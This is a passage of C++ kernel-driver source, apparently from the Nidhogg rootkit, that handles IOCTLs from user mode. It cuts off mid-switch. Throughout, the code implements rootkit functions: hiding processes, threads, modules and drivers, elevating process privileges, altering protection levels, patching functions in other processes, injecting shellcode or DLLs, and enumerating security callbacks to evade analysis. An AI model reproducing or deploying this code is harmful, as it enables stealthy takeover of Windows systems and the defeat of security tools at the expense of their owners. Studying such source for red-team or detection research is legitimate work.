#include "pch.h"
#include "IrpHandlers.h"

/*
* Description:
* NidhoggDeviceControl is responsible for handling IOCTLs and returning output to the user via IRPs.
* Every user communication should go through this function using the relevant IOCTL.
*
* Parameters:
* @DeviceObject [_Inout_ PDEVICE_OBJECT] -- Not used.
* @Irp			[_Inout_ PIRP]			 -- The IRP that contains the user data such as SystemBuffer, Irp stack, etc.
*
* Returns:
* @status		[NTSTATUS]			  -- Whether the function succeeded or not, if not the error code.
*/
_Function_class_(DRIVER_DISPATCH)
_IRQL_requires_max_(DISPATCH_LEVEL)
_IRQL_requires_same_
NTSTATUS NidhoggDeviceControl(_Inout_ PDEVICE_OBJECT DeviceObject, _Inout_ PIRP Irp) {
	UNREFERENCED_PARAMETER(DeviceObject);

	NTSTATUS status = STATUS_SUCCESS;
	SIZE_T len = 0;
	IrqlGuard guard(PASSIVE_LEVEL);
	PIO_STACK_LOCATION stack = IoGetCurrentIrpStackLocation(Irp);

	switch (stack->Parameters.DeviceIoControl.IoControlCode) {
	case IOCTL_PROTECT_UNPROTECT_PROCESS:
	{
		if (!Features.ProcessProtection) {
			Print(DRIVER_PREFIX "Due to previous error, process protection feature is unavaliable.\n");
			status = STATUS_UNSUCCESSFUL;
			break;
		}
		ULONG size = stack->Parameters.DeviceIoControl.InputBufferLength;

		if (size != sizeof(IoctlProcessEntry)) {
			status = STATUS_INVALID_BUFFER_SIZE;
			break;
		}
		auto data = static_cast<IoctlProcessEntry*>(Irp->AssociatedIrp.SystemBuffer);

		if (!IsValidPid(data->Pid)) {
			status = STATUS_INVALID_PARAMETER;
			break;
		}

		if (data->Protect) {
			if (!NidhoggProcessHandler->ProtectProcess(data->Pid)) {
				Print(DRIVER_PREFIX "Failed to protect process with pid %d.\n", data->Pid);
				status = STATUS_UNSUCCESSFUL;
				break;
			}
			Print(DRIVER_PREFIX "Protected process with pid %d.\n", data->Pid);
		}
		else {
			if (!NidhoggProcessHandler->RemoveProcess(data->Pid, ProcessType::Protected)) {
				Print(DRIVER_PREFIX "Did not find process with pid %d in protected list.\n", data->Pid);
				status = STATUS_NOT_FOUND;
				break;
			}
			Print(DRIVER_PREFIX "Unprotecting process with pid %d.\n", data->Pid);
		}

		len += size;
		break;
	}

	case IOCTL_CLEAR_PROCESSES:
	{
		if (!Features.ProcessProtection) {
			Print(DRIVER_PREFIX "Due to previous error, process protection feature is unavaliable.\n");
			status = STATUS_UNSUCCESSFUL;
			break;
		}
		ULONG size = stack->Parameters.DeviceIoControl.InputBufferLength;

		if (size != sizeof(ProcessType)) {
			status = STATUS_INVALID_BUFFER_SIZE;
			break;
		}
		auto data = static_cast<ProcessType*>(Irp->AssociatedIrp.SystemBuffer);

		switch (*data) {
			case ProcessType::Protected:
			case ProcessType::Hidden:
			case ProcessType::All: {
				NidhoggProcessHandler->ClearProcessList(*data);
				Print(DRIVER_PREFIX "Cleared process list of type %d.\n", *data);
				break;
			}
			default: {
				status = STATUS_INVALID_PARAMETER;
				break;
			}
		}
		break;
	}

	case IOCTL_HIDE_UNHIDE_PROCESS:
	{
		ULONG size = stack->Parameters.DeviceIoControl.InputBufferLength;

		if (size != sizeof(IoctlProcessEntry)) {
			status = STATUS_INVALID_BUFFER_SIZE;
			break;
		}
		auto data = static_cast<IoctlProcessEntry*>(Irp->AssociatedIrp.SystemBuffer);

		if (!IsValidPid(data->Pid)) {
			status = STATUS_INVALID_PARAMETER;
			break;
		}

		if (data->Protect) {
			status = NidhoggProcessHandler->HideProcess(data->Pid);

			if (!NT_SUCCESS(status)) {
				Print(DRIVER_PREFIX "Failed to hide process with pid %d: (0x%08X).\n", data->Pid, status);
				break;
			}
			Print(DRIVER_PREFIX "Hid process with pid %d.\n", data->Pid);
		}
		else {
			status = NidhoggProcessHandler->UnhideProcess(data->Pid);

			if (!NT_SUCCESS(status)) {
				Print(DRIVER_PREFIX "Failed to unhide process with pid %d: (0x%08X).\n", data->Pid, status);
				break;
			}
			Print(DRIVER_PREFIX "Revealed process with pid %d.\n", data->Pid);
		}

		len += size;
		break;
	}

	case IOCTL_ELEVATE_PROCESS:
	{
		ULONG size = stack->Parameters.DeviceIoControl.InputBufferLength;

		if (size != sizeof(ULONG)) {
			status = STATUS_INVALID_BUFFER_SIZE;
			break;
		}
		auto data = static_cast<ULONG*>(Irp->AssociatedIrp.SystemBuffer);

		if (!IsValidPid(*data)) {
			status = STATUS_INVALID_PARAMETER;
			break;
		}
		status = NidhoggProcessHandler->ElevateProcess(*data);

		if (!NT_SUCCESS(status)) {
			Print(DRIVER_PREFIX "Failed to elevate process with pid %d: (0x%08X).\n", *data, status);
			break;
		}
		Print(DRIVER_PREFIX "Elevated process with pid %d.\n", *data);

		len += size;
		break;
	}

	case IOCTL_SET_PROCESS_SIGNATURE_LEVEL:
	{
		ULONG size = stack->Parameters.DeviceIoControl.InputBufferLength;

		if (size != sizeof(IoctlProcessSignature)) {
			status = STATUS_INVALID_BUFFER_SIZE;
			break;
		}
		auto data = static_cast<IoctlProcessSignature*>(Irp->AssociatedIrp.SystemBuffer);

		if (!IsValidPid(data->Pid) ||
			(data->SignatureSigner < PsProtectedSignerNone || data->SignatureSigner > PsProtectedSignerMax) ||
			(data->SignerType < PsProtectedTypeNone || data->SignerType > PsProtectedTypeProtected)) {
			status = STATUS_INVALID_PARAMETER;
			break;
		}
		status = NidhoggProcessHandler->SetProcessSignature(data);

		if (!NT_SUCCESS(status)) {
			Print(DRIVER_PREFIX "Failed to set new signature to process with pid %d: (0x%08X).\n", data->Pid, status);
			break;
		}
		Print(DRIVER_PREFIX "New signature applied to %d.\n", data->Pid);
		len += size;
		break;
	}

	case IOCTL_LIST_PROCESSES:
	{
		ULONG size = stack->Parameters.DeviceIoControl.OutputBufferLength;

		if (size != sizeof(IoctlProcessList)) {
			status = STATUS_INVALID_BUFFER_SIZE;
			break;
		}
		auto data = static_cast<IoctlProcessList*>(Irp->AssociatedIrp.SystemBuffer);

		switch (data->Type) {
			case ProcessType::Protected: {
				if (!Features.ProcessProtection) {
					Print(DRIVER_PREFIX "Due to previous error, process protection feature is unavaliable.\n");
					status = STATUS_UNSUCCESSFUL;
					break;
				}
				status = NidhoggProcessHandler->ListProtectedProcesses(data) ? STATUS_SUCCESS : STATUS_UNSUCCESSFUL;
				break;
			}
			case ProcessType::Hidden: {
				status = NidhoggProcessHandler->ListHiddenProcesses(data) ? STATUS_SUCCESS : STATUS_UNSUCCESSFUL;
				break;
			}
			default: {
				status = STATUS_INVALID_PARAMETER;
				break;
			}
		}
		if (!NT_SUCCESS(status)) {
			Print(DRIVER_PREFIX "Failed to list processes of type %d: (0x%08X).\n", data->Type, status);
			break;
		}

		len += size;
		break;
	}

	case IOCTL_PROTECT_UNPROTECT_THREAD:
	{
		if (!Features.ThreadProtection) {
			Print(DRIVER_PREFIX "Due to previous error, thread protection feature is unavaliable.\n");
			status = STATUS_UNSUCCESSFUL;
			break;
		}
		ULONG size = stack->Parameters.DeviceIoControl.InputBufferLength;

		if (size != sizeof(IoctlThreadEntry)) {
			status = STATUS_INVALID_BUFFER_SIZE;
			break;
		}
		auto data = static_cast<IoctlThreadEntry*>(Irp->AssociatedIrp.SystemBuffer);

		if (data->Tid == 0) {
			status = STATUS_INVALID_PARAMETER;
			break;
		}

		if (data->Protect) {
			status = NidhoggThreadHandler->ProtectThread(data->Tid) ? STATUS_SUCCESS : STATUS_UNSUCCESSFUL;

			if (!NT_SUCCESS(status)) {
				Print(DRIVER_PREFIX "Failed to protect thread with tid %d: (0x%08X)\n", data->Tid, status);
				break;
			}
			Print(DRIVER_PREFIX "Protecting thread with tid %d\n", data->Tid);
		}
		else {
			status = NidhoggThreadHandler->RemoveThread(data->Tid, ThreadType::Protected) ?
				STATUS_SUCCESS : STATUS_NOT_FOUND;

			if (!NT_SUCCESS(status)) {
				Print(DRIVER_PREFIX "Failed to unprotect thread with tid %d: (0x%08X)\n", data->Tid, status);
				break;
			}
			Print(DRIVER_PREFIX "Unprotected thread with tid %d\n", data->Tid);
		}

		len += size;
		break;
	}

	case IOCTL_HIDE_UNHIDE_THREAD:
	{
		ULONG size = stack->Parameters.DeviceIoControl.InputBufferLength;

		if (size != sizeof(IoctlThreadEntry)) {
			status = STATUS_INVALID_BUFFER_SIZE;
			break;
		}
		auto data = static_cast<IoctlThreadEntry*>(Irp->AssociatedIrp.SystemBuffer);

		if (data->Tid == 0) {
			status = STATUS_INVALID_PARAMETER;
			break;
		}

		if (data->Protect) {
			status = NidhoggThreadHandler->HideThread(data->Tid);

			if (!NT_SUCCESS(status)) {
				Print(DRIVER_PREFIX "Failed to hide thread with tid %d: (0x%08X)\n", data->Tid, status);
				break;
			}
			Print(DRIVER_PREFIX "Hiding thread with tid %d\n", data->Tid);
		}
		else {
			status = NidhoggThreadHandler->UnhideThread(data->Tid);

			if (!NT_SUCCESS(status)) {
				Print(DRIVER_PREFIX "Failed to unhide thread with tid %d: (0x%08X)\n", data->Tid, status);
				break;
			}
			Print(DRIVER_PREFIX "Unhiding thread with tid %d\n", data->Tid);
		}

		len += size;
		break;
	}

	case IOCTL_CLEAR_THREADS:
	{
		if (!Features.ThreadProtection) {
			Print(DRIVER_PREFIX "Due to previous error, thread protection feature is unavaliable.\n");
			status = STATUS_UNSUCCESSFUL;
			break;
		}
		ULONG size = stack->Parameters.DeviceIoControl.InputBufferLength;

		if (size != sizeof(ThreadType)) {
			status = STATUS_INVALID_BUFFER_SIZE;
			break;
		}
		auto data = static_cast<ThreadType*>(Irp->AssociatedIrp.SystemBuffer);

		switch (*data) {
			case ThreadType::Protected:
			case ThreadType::Hidden:
			case ThreadType::All: {
				NidhoggThreadHandler->ClearThreadList(*data);
				len += size;
				break;
			}
			default: {
				status = STATUS_INVALID_PARAMETER;
				break;
			}
		}
		break;
	}

	case IOCTL_LIST_THREADS:
	{
		ULONG size = stack->Parameters.DeviceIoControl.OutputBufferLength;

		if (size != sizeof(IoctlThreadList)) {
			status = STATUS_INVALID_BUFFER_SIZE;
			break;
		}
		auto data = static_cast<IoctlThreadList*>(Irp->AssociatedIrp.SystemBuffer);

		switch (data->Type) {
		case ThreadType::Protected: {
			if (!Features.ThreadProtection) {
				Print(DRIVER_PREFIX "Due to previous error, process protection feature is unavaliable.\n");
				status = STATUS_UNSUCCESSFUL;
				break;
			}
			status = NidhoggThreadHandler->ListProtectedThreads(data) ? STATUS_SUCCESS : STATUS_UNSUCCESSFUL;
			break;
		}
		case ThreadType::Hidden: {
			status = NidhoggThreadHandler->ListHiddenThreads(data) ? STATUS_SUCCESS : STATUS_UNSUCCESSFUL;
			break;
		}
		default: {
			status = STATUS_INVALID_PARAMETER;
			break;
		}
		}

		if (!NT_SUCCESS(status)) {
			Print(DRIVER_PREFIX "Failed to list threads of type %d: (0x%08X).\n", data->Type, status);
			break;
		}

		len += size;
		break;
	}

	case IOCTL_PROTECT_UNPROTECT_FILE:
	{
		if (!Features.FileProtection) {
			Print(DRIVER_PREFIX "Due to previous error, file protection feature is unavaliable.\n");
			status = STATUS_UNSUCCESSFUL;
			break;
		}
		ULONG size = stack->Parameters.DeviceIoControl.InputBufferLength;

		if (size != sizeof(IoctlFileItem)) {
			Print(DRIVER_PREFIX "Invalid buffer type.\n");
			status = STATUS_INVALID_BUFFER_SIZE;
			break;
		}
		auto data = static_cast<IoctlFileItem*>(Irp->AssociatedIrp.SystemBuffer);
		SIZE_T filePathLen = wcslen(data->FilePath);

		if (filePathLen > MAX_PATH) {
			Print(DRIVER_PREFIX "File path is too long.\n");
			status = STATUS_INVALID_PARAMETER;
			break;
		}

		MemoryAllocator<WCHAR*> filePath(MAX_PATH * sizeof(WCHAR));
		status = filePath.CopyData(data->FilePath, filePathLen * sizeof(WCHAR));

		if (!NT_SUCCESS(status))
			break;

		if (data->Protect) {
			if (!NidhoggFileHandler->ProtectFile(filePath.Get())) {
				Print(DRIVER_PREFIX "Failed to add file.\n");
				status = STATUS_UNSUCCESSFUL;
				break;
			}
			Print(DRIVER_PREFIX "Protected file %ws.\n", filePath.Get());
		}
		else {
			if (!NidhoggFileHandler->RemoveFile(filePath.Get(), FileType::Protected)) {
				status = STATUS_NOT_FOUND;
				break;
			}
			Print(DRIVER_PREFIX "Unprotected file %ws.\n", filePath.Get());
		}

		len += size;
		break;
	}

	case IOCTL_CLEAR_PROTECTED_FILES:
	{
		if (!Features.FileProtection) {
			Print(DRIVER_PREFIX "Due to previous error, file protection feature is unavaliable.\n");
			status = STATUS_UNSUCCESSFUL;
			break;
		}
		ULONG size = stack->Parameters.DeviceIoControl.InputBufferLength;

		if (size != sizeof(FileType)) {
			status = STATUS_INVALID_BUFFER_SIZE;
			break;
		}
		auto data = static_cast<FileType*>(Irp->AssociatedIrp.SystemBuffer);

		switch (*data) {
			case FileType::Protected:
			case FileType::All: {
				NidhoggFileHandler->ClearFilesList(*data);
				len += size;
				break;
			}
			default: {
				status = STATUS_INVALID_PARAMETER;
				break;
			}
		}
		break;
	}

	case IOCTL_LIST_FILES:
	{
		ULONG size = stack->Parameters.DeviceIoControl.OutputBufferLength;

		if (size != sizeof(IoctlFileList)) {
			status = STATUS_INVALID_BUFFER_SIZE;
			break;
		}
		auto data = static_cast<IoctlFileList*>(Irp->AssociatedIrp.SystemBuffer);

		switch (data->Type) {
		case FileType::Protected: {
			if (!Features.FileProtection) {
				Print(DRIVER_PREFIX "Due to previous error, file protection feature is unavaliable.\n");
				status = STATUS_UNSUCCESSFUL;
				break;
			}
			status = NidhoggFileHandler->ListProtectedFiles(data) ? STATUS_SUCCESS : STATUS_UNSUCCESSFUL;
			break;
		}
		default: {
			status = STATUS_INVALID_PARAMETER;
			break;
		}
		}

		if (!NT_SUCCESS(status)) {
			Print(DRIVER_PREFIX "Failed to list files of type %d: (0x%08X).\n", data->Type, status);
			break;
		}

		len += size;
		break;
	}

	case IOCTL_PROTECT_HIDE_REGITEM:
	{
		IoctlRegItem regItem{};

		if (!Features.RegistryFeatures) {
			Print(DRIVER_PREFIX "Due to previous error, registry features are unavaliable.\n");
			status = STATUS_UNSUCCESSFUL;
			break;
		}
		ULONG size = stack->Parameters.DeviceIoControl.InputBufferLength;

		if (size != sizeof(IoctlRegItem)) {
			Print(DRIVER_PREFIX "Invalid buffer type.\n");
			status = STATUS_INVALID_BUFFER_SIZE;
			break;
		}
		auto data = static_cast<IoctlRegItem*>(Irp->AssociatedIrp.SystemBuffer);
		regItem.Type = data->Type;
		SIZE_T keyLen = wcslen(data->KeyPath);

		if (!NidhoggRegistryHandler->IsValidKey(data->KeyPath)) {
			Print(DRIVER_PREFIX "Key is invalid.\n");
			status = STATUS_INVALID_PARAMETER;
			break;
		}
		errno_t err = wcsncpy_s(regItem.KeyPath, data->KeyPath, keyLen);

		if (err != 0) {
			Print(DRIVER_PREFIX "Failed to copy to buffer.\n");
			status = STATUS_INVALID_PARAMETER;
			break;
		}

		if (regItem.Type == RegItemType::ProtectedValue || regItem.Type == RegItemType::HiddenValue) {
			SIZE_T valueLen = wcslen(data->ValueName);

			if (!NidhoggRegistryHandler->IsValidValue(data->ValueName)) {
				Print(DRIVER_PREFIX "Value is invalid.\n");
				status = STATUS_INVALID_PARAMETER;
				break;
			}
			err = wcsncpy_s(regItem.ValueName, data->ValueName, valueLen);

			if (err != 0) {
				Print(DRIVER_PREFIX "Failed to copy to buffer.\n");
				status = STATUS_INVALID_PARAMETER;
				break;
			}
		}
		if (!NidhoggRegistryHandler->AddRegItem(regItem)) {
			Print(DRIVER_PREFIX "Failed to add registry item\n");
			status = STATUS_ALREADY_REGISTERED;
			break;
		}
		Print(DRIVER_PREFIX "Added new registry item of type %d.\n", regItem.Type);

		len += size;
		break;
	}

	case IOCTL_UNPROTECT_UNHIDE_REGITEM:
	{
		IoctlRegItem regItem{};

		if (!Features.RegistryFeatures) {
			Print(DRIVER_PREFIX "Due to previous error, registry features are unavaliable.\n");
			status = STATUS_UNSUCCESSFUL;
			break;
		}
		ULONG size = stack->Parameters.DeviceIoControl.InputBufferLength;

		if (size != sizeof(IoctlRegItem)) {
			Print(DRIVER_PREFIX "Invalid buffer type.\n");
			status = STATUS_INVALID_BUFFER_SIZE;
			break;
		}
		auto data = static_cast<IoctlRegItem*>(Irp->AssociatedIrp.SystemBuffer);
		regItem.Type = data->Type;
		SIZE_T keyLen = wcslen(data->KeyPath);

		if (!NidhoggRegistryHandler->IsValidKey(data->KeyPath)) {
			Print(DRIVER_PREFIX "Key is invalid.\n");
			status = STATUS_INVALID_PARAMETER;
			break;
		}
		errno_t err = wcsncpy_s(regItem.KeyPath, data->KeyPath, keyLen);

		if (err != 0) {
			Print(DRIVER_PREFIX "Failed to copy to buffer.\n");
			status = STATUS_INVALID_PARAMETER;
			break;
		}

		if (regItem.Type == RegItemType::ProtectedValue || regItem.Type == RegItemType::HiddenValue) {
			SIZE_T valueLen = wcslen(data->ValueName);

			if (!NidhoggRegistryHandler->IsValidValue(data->ValueName)) {
				Print(DRIVER_PREFIX "Value is invalid.\n");
				status = STATUS_INVALID_PARAMETER;
				break;
			}
			err = wcsncpy_s(regItem.ValueName, data->ValueName, valueLen);

			if (err != 0) {
				Print(DRIVER_PREFIX "Failed to copy to buffer.\n");
				status = STATUS_INVALID_PARAMETER;
				break;
			}
		}
		if (!NidhoggRegistryHandler->RemoveRegItem(regItem)) {
			Print(DRIVER_PREFIX "Failed to remove registry item\n");
			status = STATUS_UNSUCCESSFUL;
			break;
		}
		Print(DRIVER_PREFIX "Removed registry item of type %d.\n", regItem.Type);

		len += size;
		break;
	}

	case IOCTL_CLEAR_REGITEMS:
	{
		if (!Features.RegistryFeatures) {
			Print(DRIVER_PREFIX "Due to previous error, registry features are unavaliable.\n");
			status = STATUS_UNSUCCESSFUL;
			break;
		}
		ULONG size = stack->Parameters.DeviceIoControl.InputBufferLength;

		if (size != sizeof(RegItemType)) {
			status = STATUS_INVALID_BUFFER_SIZE;
			break;
		}
		auto data = static_cast<RegItemType*>(Irp->AssociatedIrp.SystemBuffer);

		switch (*data) {
			case RegItemType::HiddenKey:
			case RegItemType::ProtectedKey:
			case RegItemType::ProtectedValue:
			case RegItemType::HiddenValue: {
				NidhoggRegistryHandler->ClearRegistryList(*data);
				len += size;
				break;
			}
			default: {
				status = STATUS_INVALID_PARAMETER;
				break;
			}
		}
		break;
	}

	case IOCTL_LIST_REGITEMS:
	{
		if (!Features.RegistryFeatures) {
			Print(DRIVER_PREFIX "Due to previous error, registry features are unavaliable.\n");
			status = STATUS_UNSUCCESSFUL;
			break;
		}
		ULONG size = stack->Parameters.DeviceIoControl.OutputBufferLength;

		if (size != sizeof(IoctlRegistryList)) {
			status = STATUS_INVALID_BUFFER_SIZE;
			break;
		}
		auto data = static_cast<IoctlRegistryList*>(Irp->AssociatedIrp.SystemBuffer);
		status = NidhoggRegistryHandler->ListRegistryItems(data) ? STATUS_SUCCESS : STATUS_UNSUCCESSFUL;

		len += size;
		break;
	}

	case IOCTL_PATCH_MODULE:
	{
		IoctlPatchedModule patchedModule{};

		if (!Features.FunctionPatching) {
			Print(DRIVER_PREFIX "Due to previous error, function patching feature is unavaliable.\n");
			status = STATUS_UNSUCCESSFUL;
			break;
		}
		ULONG size = stack->Parameters.DeviceIoControl.InputBufferLength;

		if (size != sizeof(IoctlPatchedModule)) {
			Print(DRIVER_PREFIX "Invalid buffer type.\n");
			status = STATUS_INVALID_BUFFER_SIZE;
			break;
		}
		auto data = static_cast<IoctlPatchedModule*>(Irp->AssociatedIrp.SystemBuffer);
		patchedModule.Pid = data->Pid;
		patchedModule.PatchLength = data->PatchLength;
		SIZE_T strSize = strlen(data->FunctionName);

		MemoryAllocator<CHAR*> functionName(strSize);
		status = functionName.CopyData(data->FunctionName, strSize);

		if (!NT_SUCCESS(status))
			break;
		patchedModule.FunctionName = functionName.Get();

		strSize = wcslen(data->ModuleName) * sizeof(WCHAR);
		MemoryAllocator<WCHAR*> moduleName(strSize);
		status = moduleName.CopyData(data->ModuleName, strSize);

		if (!NT_SUCCESS(status))
			break;
		patchedModule.ModuleName = moduleName.Get();

		MemoryAllocator<PVOID> patch(data->PatchLength);
		status = patch.CopyData(data->Patch, data->PatchLength);

		if (!NT_SUCCESS(status))
			break;
		patchedModule.Patch = patch.Get();

		if (!IsValidPid(data->Pid)) {
			Print(DRIVER_PREFIX "Invalid PID.\n");
			status = STATUS_INVALID_PARAMETER;
			break;
		}
		status = NidhoggMemoryHandler->PatchModule(patchedModule);

		if (!NT_SUCCESS(status)) {
			Print(DRIVER_PREFIX "Failed to patch module %ws and function %s for process %d: (0x%08X).\n", 
				patchedModule.ModuleName, patchedModule.FunctionName, patchedModule.Pid, status);
			break;
		}
		Print(DRIVER_PREFIX "Patched module %ws and function %s for process %d.\n", patchedModule.ModuleName, patchedModule.FunctionName, patchedModule.Pid);
		len += size;
		break;
	}

	case IOCTL_HIDE_RESTORE_MODULE:
	{
		IoctlHiddenModuleInfo hiddenModule{};

		if (!Features.ModuleHiding) {
			Print(DRIVER_PREFIX "Due to previous error, hiding module feature is unavaliable.\n");
			status = STATUS_UNSUCCESSFUL;
			break;
		}
		ULONG size = stack->Parameters.DeviceIoControl.InputBufferLength;

		if (size != sizeof(IoctlHiddenModuleInfo)) {
			Print(DRIVER_PREFIX "Invalid buffer type.\n");
			status = STATUS_INVALID_BUFFER_SIZE;
			break;
		}
		auto data = static_cast<IoctlHiddenModuleInfo*>(Irp->AssociatedIrp.SystemBuffer);
		hiddenModule.Hide = data->Hide;
		hiddenModule.Pid = data->Pid;
		SIZE_T moduleNameSize = (wcslen(data->ModuleName) + 1) * sizeof(WCHAR);

		MemoryAllocator<WCHAR*> moduleName(moduleNameSize);
		status = moduleName.CopyData(data->ModuleName, moduleNameSize);

		if (!NT_SUCCESS(status))
			break;
		hiddenModule.ModuleName = moduleName.Get();

		if (!IsValidPid(hiddenModule.Pid)) {
			Print(DRIVER_PREFIX "Buffer is invalid.\n");
			status = STATUS_INVALID_PARAMETER;
			break;
		}
		status = hiddenModule.Hide ? NidhoggMemoryHandler->HideModule(hiddenModule) : 
			NidhoggMemoryHandler->RestoreModule(hiddenModule);

		if (!NT_SUCCESS(status)) {
			if (hiddenModule.Hide)
				Print(DRIVER_PREFIX "Failed to hide module %ws for process %d: (0x%08X).\n", hiddenModule.ModuleName, 
					hiddenModule.Pid, status);
			else
				Print(DRIVER_PREFIX "Failed to restore module %ws for process %d: (0x%08X).\n", hiddenModule.ModuleName, 
					hiddenModule.Pid, status);
			break;
		}
		if (hiddenModule.Hide)
			Print(DRIVER_PREFIX "Hid module %ws for process %d.\n", hiddenModule.ModuleName, hiddenModule.Pid);
		else
			Print(DRIVER_PREFIX "Restored module %ws for process %d.\n", hiddenModule.ModuleName, hiddenModule.Pid);

		len += size;
		break;
	}

	case IOCTL_HIDE_UNHIDE_DRIVER:
	{
		auto size = stack->Parameters.DeviceIoControl.InputBufferLength;

		if (size != sizeof(IoctlHiddenDriverInfo)) {
			Print(DRIVER_PREFIX "Invalid buffer type.\n");
			status = STATUS_INVALID_BUFFER_SIZE;
			break;
		}
		auto data = static_cast<IoctlHiddenDriverInfo*>(Irp->AssociatedIrp.SystemBuffer);
		SIZE_T driverNameSize = (wcslen(data->DriverName) + 1) * sizeof(WCHAR);

		MemoryAllocator<WCHAR*> driverName(driverNameSize);
		status = driverName.CopyData(data->DriverName, driverNameSize);

		if (!NT_SUCCESS(status)) {
			Print(DRIVER_PREFIX "Buffer is invalid.\n");
			break;
		}

		if (data->Hide) {
			status = NidhoggMemoryHandler->HideDriver(driverName.Get());

			if (!NT_SUCCESS(status)) {
				Print(DRIVER_PREFIX "Failed to hide driver %ws: (0x%08X)\n", driverName.Get(), status);
				break;
			}
			Print(DRIVER_PREFIX "Hid driver %ws.\n", driverName.Get());
		}
		else {
			status = NidhoggMemoryHandler->UnhideDriver(driverName.Get());

			if (!NT_SUCCESS(status)) {
				Print(DRIVER_PREFIX "Failed to restore driver %ws: (0x%08X)\n", driverName.Get(), status);
				break;
			}
			Print(DRIVER_PREFIX "Restored driver %ws.\n", driverName.Get());
		}

		len += size;
		break;
	}

	case IOCTL_INJECT_SHELLCODE:
	{
		IoctlShellcodeInfo shellcodeInfo{};
		auto size = stack->Parameters.DeviceIoControl.InputBufferLength;

		if (size != sizeof(IoctlShellcodeInfo)) {
			status = STATUS_INVALID_BUFFER_SIZE;
			break;
		}
		auto data = static_cast<IoctlShellcodeInfo*>(Irp->AssociatedIrp.SystemBuffer);
		shellcodeInfo.Pid = data->Pid;

		if (!IsValidPid(shellcodeInfo.Pid)) {
			status = STATUS_INVALID_PARAMETER;
			break;
		}

		shellcodeInfo.Type = data->Type;
		shellcodeInfo.ShellcodeSize = data->ShellcodeSize;
		shellcodeInfo.Parameter1 = NULL;
		shellcodeInfo.Parameter1Size = data->Parameter1Size;
		shellcodeInfo.Parameter2 = NULL;
		shellcodeInfo.Parameter2Size = data->Parameter2Size;
		shellcodeInfo.Parameter3 = NULL;
		shellcodeInfo.Parameter3Size = data->Parameter3Size;

		MemoryAllocator<PVOID> shellcode(shellcodeInfo.ShellcodeSize);
		status = shellcode.CopyData(data->Shellcode, shellcodeInfo.ShellcodeSize);

		if (!NT_SUCCESS(status))
			break;
		shellcodeInfo.Shellcode = shellcode.Get();

		// Copy parameters
		if (shellcodeInfo.Parameter1Size > 0) {
			MemoryAllocator<PVOID> parameter1(shellcodeInfo.Parameter1Size);
			status = parameter1.CopyData(data->Parameter1, shellcodeInfo.Parameter1Size);

			if (!NT_SUCCESS(status))
				break;
			shellcodeInfo.Parameter1 = parameter1.Get();
		}

		if (shellcodeInfo.Parameter2Size > 0) {
			MemoryAllocator<PVOID> parameter2(shellcodeInfo.Parameter2Size);
			status = parameter2.CopyData(data->Parameter2, shellcodeInfo.Parameter2Size);

			if (!NT_SUCCESS(status))
				break;
			shellcodeInfo.Parameter2 = parameter2.Get();
		}

		if (shellcodeInfo.Parameter3Size > 0) {
			MemoryAllocator<PVOID> parameter3(shellcodeInfo.Parameter3Size);
			status = parameter3.CopyData(data->Parameter3, shellcodeInfo.Parameter3Size);

			if (!NT_SUCCESS(status))
				break;
			shellcodeInfo.Parameter3 = parameter3.Get();
		}

		switch (shellcodeInfo.Type) {
		case InjectionType::APCInjection: {
			if (!Features.ApcInjection) {
				Print(DRIVER_PREFIX "Due to previous error, APC shellcode injection feature is unavaliable.\n");
				status = STATUS_UNSUCCESSFUL;
				break;
			}

			status = NidhoggMemoryHandler->InjectShellcodeAPC(shellcodeInfo);
			break;
		}
		case InjectionType::CreateThreadInjection: {
			status = NidhoggMemoryHandler->InjectShellcodeThread(shellcodeInfo);
			break;
		}
		default:
			status = STATUS_INVALID_PARAMETER;
			break;
		}

		if (!NT_SUCCESS(status)) {
			Print(DRIVER_PREFIX "Failed to inject shellcode (0x%08X)\n", status);
			break;
		}

		Print(DRIVER_PREFIX "Shellcode injected successfully.\n");
		len += size;
		break;
	}

	case IOCTL_INJECT_DLL:
	{
		IoctlDllInfo dllInfo{};
		ULONG size = stack->Parameters.DeviceIoControl.InputBufferLength;

		if (size != sizeof(IoctlDllInfo)) {
			status = STATUS_INVALID_BUFFER_SIZE;
			break;
		}
		auto data = static_cast<IoctlDllInfo*>(Irp->AssociatedIrp.SystemBuffer);
		dllInfo.Pid = data->Pid;
		dllInfo.Type = data->Type;
		SIZE_T dllPathSize = strlen(data->DllPath);

		if (dllPathSize > MAX_PATH) {
			status = STATUS_INVALID_BUFFER_SIZE;
			break;
		}
		errno_t err = strcpy_s(dllInfo.DllPath, data->DllPath);

		if (err != 0) {
			status = STATUS_INVALID_BUFFER_SIZE;
			break;
		}

		if (!IsValidPid(dllInfo.Pid)) {
			status = STATUS_INVALID_PARAMETER;
			break;
		}

		switch (dllInfo.Type) {
		case InjectionType::APCInjection: {
			if (!Features.ApcInjection) {
				Print(DRIVER_PREFIX "Due to previous error, APC dll injection feature is unavaliable.\n");
				status = STATUS_UNSUCCESSFUL;
				break;
			}

			status = NidhoggMemoryHandler->InjectDllAPC(dllInfo);
			break;
		}
		case InjectionType::CreateThreadInjection: {
			status = NidhoggMemoryHandler->InjectDllThread(dllInfo);
			break;
		}
		default:
			status = STATUS_INVALID_PARAMETER;
			break;
		}

		if (!NT_SUCCESS(status)) {
			Print(DRIVER_PREFIX "Failed to inject DLL (0x%08X)\n", status);
			break;
		}

		Print(DRIVER_PREFIX "DLL injected successfully.\n");
		len += size;
		break;
	}

	case IOCTL_LIST_OBCALLBACKS:
	{
		ULONG size = stack->Parameters.DeviceIoControl.InputBufferLength;

		if (size != sizeof(IoctlCallbackList<ObCallback>)) {
			status = STATUS_INVALID_BUFFER_SIZE;
			break;
		}
		auto data = static_cast<IoctlCallbackList<ObCallback>*>(Irp->AssociatedIrp.SystemBuffer);

		if (data->Count == 0 && data->Callbacks) {
			status = STATUS_INVALID_PARAMETER;
			break;
		}

		switch (data->Type) {
		case ObProcessType:
		case ObThreadType: {
			status = NidhoggAntiAnalysisHandler->ListObCallbacks(data);
			break;
		}
		default:
			status = STATUS_INVALID_PARAMETER;
		}

		if (!NT_SUCCESS(status)) {
			Print(DRIVER_PREFIX "Failed to list object callbacks (0x%08X).\n", status);
			break;
		}

		len += size;
		break;
	}

	case IOCTL_LIST_PSROUTINES:
	{
		ULONG size = stack->Parameters.DeviceIoControl.InputBufferLength;

		if (size != sizeof(IoctlCallbackList<PsRoutine>)) {
			status = STATUS_INVALID_BUFFER_SIZE;
			break;
		}
		auto data = static_cast<IoctlCallbackList<PsRoutine>*>(Irp->AssociatedIrp.SystemBuffer);

		switch (data->Type) {
		case PsImageLoadType:
		case PsCreateProcessTypeEx:
		case PsCreateProcessType:
		case PsCreateThreadType:
